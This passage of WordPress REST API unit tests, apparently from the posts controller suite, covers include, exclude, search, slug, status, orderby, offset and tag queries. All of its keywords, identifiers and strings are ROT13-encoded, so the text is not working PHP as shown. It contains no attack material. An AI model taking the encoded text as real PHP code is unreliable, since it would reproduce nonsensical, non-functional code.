				'cbfg_glcr'   => 'cntr',
			)
		);
		$vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_glcr'   => 'cntr',
			)
		);
		$vq3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $vq1,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cntrf' );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq1, $vq2, $vq3 ) );
		$erdhrfg->frg_cnenz( 'beqreol', 'cnerag' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( $vq3, $qngn[0]['vq'] );
		// Purpx beqrevat. Qrsnhyg BEQRE vf QRFP.
		$guvf->nffregFnzr( $vq1, $qngn[0]['cnerag'] );
		$guvf->nffregFnzr( 0, $qngn[1]['cnerag'] );
		$guvf->nffregFnzr( 0, $qngn[2]['cnerag'] );

		$guvf->nffregCbfgfBeqrerqOl( '{cbfgf}.cbfg_cnerag QRFP' );
	}

	choyvp shapgvba grfg_trg_vgrzf_rkpyhqr_dhrel() {
		$vq1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$vq2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$vqf      = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregPbagnvaf( $vq2, $vqf );

		$erdhrfg->frg_cnenz( 'rkpyhqr', neenl( $vq2 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$vqf      = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregAbgPbagnvaf( $vq2, $vqf );

		$erdhrfg->frg_cnenz( 'rkpyhqr', (fgevat) $vq2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$vqf      = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregAbgPbagnvaf( $vq2, $vqf );

		$erdhrfg->frg_cnenz( 'rkpyhqr', 'vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_frnepu_dhrel() {
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Frnepu Erfhyg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		$gbgny_cbfgf = frys::$gbgny_cbfgf + 1;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $gbgny_cbfgf, $erfcbafr->trg_qngn() );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'frnepu', 'Frnepu Erfhyg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( 'Frnepu Erfhyg', $qngn[0]['gvgyr']['eraqrerq'] );
	}

	/**
	 * @gvpxrg 63307
	 */
	choyvp shapgvba grfg_trg_vgrzf_fyht_dhrel() {
		$vq1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Nccyr',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		$vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Onanan',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		hcqngr_bcgvba( 'fgvpxl_cbfgf', neenl( $vq2 ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fyht', 'nccyr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( 'Nccyr', $qngn[0]['gvgyr']['eraqrerq'], 'Erghea gur cbfg jvgu gur tvira fyht' );
	}

	choyvp shapgvba grfg_trg_vgrzf_zhygvcyr_fyhtf_neenl_dhrel() {
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Nccyr',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Onanan',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Crnpu',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fyht', neenl( 'onanan', 'crnpu' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$gvgyrf = neenl(
			$qngn[0]['gvgyr']['eraqrerq'],
			$qngn[1]['gvgyr']['eraqrerq'],
		);
		fbeg( $gvgyrf );
		$guvf->nffregFnzr( neenl( 'Onanan', 'Crnpu' ), $gvgyrf );
	}

	choyvp shapgvba grfg_trg_vgrzf_zhygvcyr_fyhtf_fgevat_dhrel() {
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Nccyr',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Onanan',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Crnpu',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fyht', 'nccyr,onanan' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$gvgyrf = neenl(
			$qngn[0]['gvgyr']['eraqrerq'],
			$qngn[1]['gvgyr']['eraqrerq'],
		);
		fbeg( $gvgyrf );
		$guvf->nffregFnzr( neenl( 'Nccyr', 'Onanan' ), $gvgyrf );
	}

	choyvp shapgvba grfg_trg_vgrzf_fgnghf_dhrel() {
		jc_frg_pheerag_hfre( 0 );

		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'qensg' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'fgnghf', 'choyvfu' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregPbhag( frys::$gbgny_cbfgf, $erfcbafr->trg_qngn() );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgnghf', 'qensg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgnghf', 'qensg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn() );
	}

	choyvp shapgvba grfg_trg_vgrzf_zhygvcyr_fgnghfrf_fgevat_dhrel() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'qensg' ) );
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'cevingr' ) );
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( 'fgnghf', 'qensg,cevingr' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$fgnghfrf = neenl(
			$qngn[0]['fgnghf'],
			$qngn[1]['fgnghf'],
		);
		fbeg( $fgnghfrf );
		$guvf->nffregFnzr( neenl( 'qensg', 'cevingr' ), $fgnghfrf );
	}

	choyvp shapgvba grfg_trg_vgrzf_zhygvcyr_fgnghfrf_neenl_dhrel() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'qensg' ) );
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'craqvat' ) );
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( 'fgnghf', neenl( 'qensg', 'craqvat' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$fgnghfrf = neenl(
			$qngn[0]['fgnghf'],
			$qngn[1]['fgnghf'],
		);
		fbeg( $fgnghfrf );
		$guvf->nffregFnzr( neenl( 'qensg', 'craqvat' ), $fgnghfrf );
	}

	choyvp shapgvba grfg_trg_vgrzf_zhygvcyr_fgnghfrf_bar_vainyvq_dhrel() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( 'fgnghf', neenl( 'qensg', 'abafrafr' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 43701
	 */
	choyvp shapgvba grfg_trg_vgrzf_zhygvcyr_fgnghfrf_phfgbz_ebyr_bar_vainyvq_dhrel() {
		$cevingr_cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'cevingr' ) );

		jc_frg_pheerag_hfre( frys::$cevingr_ernqre_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgnghf', neenl( 'cevingr', 'shgher' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_fgnghf_dhrel() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgnghf', 'vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_fgnghf_jvgubhg_crezvffvbaf() {
		$qensg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'qensg',
			)
		);

		jc_frg_pheerag_hfre( 0 );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$nyy_qngn = $erfcbafr->trg_qngn();

		$guvf->nffregAbgRzcgl( $nyy_qngn );

		sbernpu ( $nyy_qngn nf $cbfg ) {
			$guvf->nffregAbgRdhnyf( $qensg_vq, $cbfg['vq'] );
		}
	}

	/**
	 * @gvpxrg 56350
	 *
	 * @qngnCebivqre qngn_trg_vgrzf_rknpg_frnepu
	 *
	 * @cnenz fgevat $frnepu_grez  Gur frnepu grez.
	 * @cnenz obby   $rknpg_frnepu Jurgure gur frnepu vf na rknpg be trareny frnepu.
	 * @cnenz vag    $rkcrpgrq     Gur rkcrpgrq ahzore bs zngpuvat cbfgf.
	 */
	choyvp shapgvba grfg_trg_vgrzf_rknpg_frnepu( $frnepu_grez, $rknpg_frnepu, $rkcrpgrq ) {
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Elr',
				'cbfg_pbagrag' => 'Guvf vf n cbfg nobhg Elr Oernq',
			)
		);

		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Glcrf bs Oernq',
				'cbfg_pbagrag' => 'Glcrf bs oernq ner Juvgr naq Elr Oernq',
			)
		);

		$erdhrfg           = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg['frnepu'] = $frnepu_grez;
		vs ( $rknpg_frnepu ) {
			$erdhrfg['frnepu_frznagvpf'] = 'rknpg';
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $rkcrpgrq, $erfcbafr->trg_qngn() );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrzf_rknpg_frnepu().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_vgrzf_rknpg_frnepu() {
		erghea neenl(
			'trareny frnepu, bar rknpg zngpu naq bar cnegvny zngpu' => neenl(
				'frnepu_grez'  => 'Elr',
				'rknpg_frnepu' => snyfr,
				'rkcrpgrq'     => 2,
			),
			'rknpg frnepu, bar rknpg zngpu naq bar cnegvny zngpu' => neenl(
				'frnepu_grez'  => 'Elr',
				'rknpg_frnepu' => gehr,
				'rkcrpgrq'     => 1,
			),
			'rknpg frnepu, ab zngpu naq bar cnegvny zngpu' => neenl(
				'frnepu_grez'  => 'Elr Oernq',
				'rknpg_frnepu' => gehr,
				'rkcrpgrq'     => 0,
			),
		);
	}

	choyvp shapgvba grfg_trg_vgrzf_beqre_naq_beqreol() {
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Nccyr Cvr',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Nccyr Fnhpr',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Nccyr Pbooyre',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Nccyr Pbssrr Pnxr',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'frnepu', 'Nccyr' );

		// Beqre qrsnhygf gb 'qrfp'.
		$erdhrfg->frg_cnenz( 'beqreol', 'gvgyr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Nccyr Fnhpr', $qngn[0]['gvgyr']['eraqrerq'] );
		$guvf->nffregCbfgfBeqrerqOl( '{cbfgf}.cbfg_gvgyr QRFP' );

		// 'beqre' => 'nfp'.
		$erdhrfg->frg_cnenz( 'beqre', 'nfp' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Nccyr Pbooyre', $qngn[0]['gvgyr']['eraqrerq'] );
		$guvf->nffregCbfgfBeqrerqOl( '{cbfgf}.cbfg_gvgyr NFP' );

		// 'beqre' => 'nfp,vq' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'beqre', 'nfp,vq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		// 'beqreol' => 'pbagrag' fubhyq reebe (vainyvq cnenz grfg).
		$erdhrfg->frg_cnenz( 'beqre', 'nfp' );
		$erdhrfg->frg_cnenz( 'beqreol', 'pbagrag' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_jvgu_beqreol_vapyhqr_jvgubhg_vapyhqr_cnenz() {
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'vapyhqr' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_beqreol_vapyhqr_zvffvat_vapyhqr', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_jvgu_beqreol_vq() {
		$vq1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_qngr'   => '2016-01-13 02:26:48',
			)
		);
		$vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_qngr'   => '2016-01-12 02:26:48',
			)
		);
		$vq3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_qngr'   => '2016-01-11 02:26:48',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'vq' );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq1, $vq2, $vq3 ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		// Qrsnhyg BEQRE vf QRFP.
		$guvf->nffregFnzr( $vq3, $qngn[0]['vq'] );
		$guvf->nffregFnzr( $vq2, $qngn[1]['vq'] );
		$guvf->nffregFnzr( $vq1, $qngn[2]['vq'] );
		$guvf->nffregCbfgfBeqrerqOl( '{cbfgf}.VQ QRFP' );
	}

	choyvp shapgvba grfg_trg_vgrzf_jvgu_beqreol_fyht() {
		$vq1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'NOP',
				'cbfg_anzr'   => 'klm',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		$vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'KLM',
				'cbfg_anzr'   => 'nop',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'fyht' );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq1, $vq2 ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		// Qrsnhyg BEQRE vf QRFP.
		$guvf->nffregFnzr( 'klm', $qngn[0]['fyht'] );
		$guvf->nffregFnzr( 'nop', $qngn[1]['fyht'] );
		$guvf->nffregCbfgfBeqrerqOl( '{cbfgf}.cbfg_anzr QRFP' );
	}

	choyvp shapgvba grfg_trg_vgrzf_jvgu_beqreol_fyhtf() {
		$fyhtf = neenl( 'oheevgb', 'gnpb', 'punyhcn' );
		sbernpu ( $fyhtf nf $fyht ) {
			frys::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_gvgyr'  => $fyht,
					'cbfg_anzr'   => $fyht,
					'cbfg_fgnghf' => 'choyvfu',
				)
			);
		}

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'vapyhqr_fyhtf' );
		$erdhrfg->frg_cnenz( 'fyht', neenl( 'gnpb', 'punyhcn', 'oheevgb' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 'gnpb', $qngn[0]['fyht'] );
		$guvf->nffregFnzr( 'punyhcn', $qngn[1]['fyht'] );
		$guvf->nffregFnzr( 'oheevgb', $qngn[2]['fyht'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_jvgu_beqreol_eryrinapr() {
		$vq1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Gvgyr vf zber eryrinag',
				'cbfg_pbagrag' => 'Pbagrag vf',
				'cbfg_fgnghf'  => 'choyvfu',
			)
		);
		$vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Gvgyr vf',
				'cbfg_pbagrag' => 'Pbagrag vf yrff eryrinag',
				'cbfg_fgnghf'  => 'choyvfu',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'eryrinapr' );
		$erdhrfg->frg_cnenz( 'frnepu', 'eryrinag' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );
		$guvf->nffregFnzr( $vq2, $qngn[1]['vq'] );
		$guvf->nffregCbfgfBeqrerqOl( '{cbfgf}.cbfg_gvgyr YVXR \'%eryrinag%\' QRFP, {cbfgf}.cbfg_qngr QRFP' );
	}

	choyvp shapgvba grfg_trg_vgrzf_jvgu_beqreol_eryrinapr_gjb_grezf() {
		$vq1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Gvgyr vf zber eryrinag',
				'cbfg_pbagrag' => 'Pbagrag vf',
				'cbfg_fgnghf'  => 'choyvfu',
			)
		);
		$vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Gvgyr vf',
				'cbfg_pbagrag' => 'Pbagrag vf yrff eryrinag',
				'cbfg_fgnghf'  => 'choyvfu',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'eryrinapr' );
		$erdhrfg->frg_cnenz( 'frnepu', 'eryrinag pbagrag' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );
		$guvf->nffregFnzr( $vq2, $qngn[1]['vq'] );
		$guvf->nffregCbfgfBeqrerqOl( '(PNFR JURA {cbfgf}.cbfg_gvgyr YVXR \'%eryrinag pbagrag%\' GURA 1 JURA {cbfgf}.cbfg_gvgyr YVXR \'%eryrinag%\' NAQ {cbfgf}.cbfg_gvgyr YVXR \'%pbagrag%\' GURA 2 JURA {cbfgf}.cbfg_gvgyr YVXR \'%eryrinag%\' BE {cbfgf}.cbfg_gvgyr YVXR \'%pbagrag%\' GURA 3 JURA {cbfgf}.cbfg_rkprecg YVXR \'%eryrinag pbagrag%\' GURA 4 JURA {cbfgf}.cbfg_pbagrag YVXR \'%eryrinag pbagrag%\' GURA 5 RYFR 6 RAQ), {cbfgf}.cbfg_qngr QRFP' );
	}

	choyvp shapgvba grfg_trg_vgrzf_jvgu_beqreol_eryrinapr_zvffvat_frnepu() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'eryrinapr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_frnepu_grez_qrsvarq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_bssfrg_dhrel() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'bssfrg', 1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( frys::$gbgny_cbfgf - 1, $erfcbafr->trg_qngn() );

		// 'bssfrg' jbexf jvgu 'cre_cntr'.
		$erdhrfg->frg_cnenz( 'cre_cntr', 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 2, $erfcbafr->trg_qngn() );

		// 'bssfrg' gnxrf cevbevgl bire 'cntr'.
		$erdhrfg->frg_cnenz( 'cntr', 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 2, $erfcbafr->trg_qngn() );

		// Vainyvq 'bssfrg' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'bssfrg', 'zbercyrnfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_gntf_dhrel() {
		$vq1 = frys::$cbfg_vq;
		$gnt = jc_vafreg_grez( 'Zl Gnt', 'cbfg_gnt' );

		jc_frg_bowrpg_grezf( $vq1, neenl( $gnt['grez_vq'] ), 'cbfg_gnt' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'gntf', neenl( $gnt['grez_vq'] ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_gntf_rkpyhqr_dhrel() {
		$vq1 = frys::$cbfg_vq;
		$vq2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$vq3 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$vq4 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$gnt = jc_vafreg_grez( 'Zl Gnt', 'cbfg_gnt' );

		$gbgny_cbfgf = frys::$gbgny_cbfgf + 3;

		jc_frg_bowrpg_grezf( $vq1, neenl( $gnt['grez_vq'] ), 'cbfg_gnt' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'gntf_rkpyhqr', neenl( $gnt['grez_vq'] ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( $gbgny_cbfgf - 1, $qngn );
		$guvf->nffregFnzr( $vq4, $qngn[0]['vq'] );
		$guvf->nffregFnzr( $vq3, $qngn[1]['vq'] );
		$guvf->nffregFnzr( $vq2, $qngn[2]['vq'] );
	}

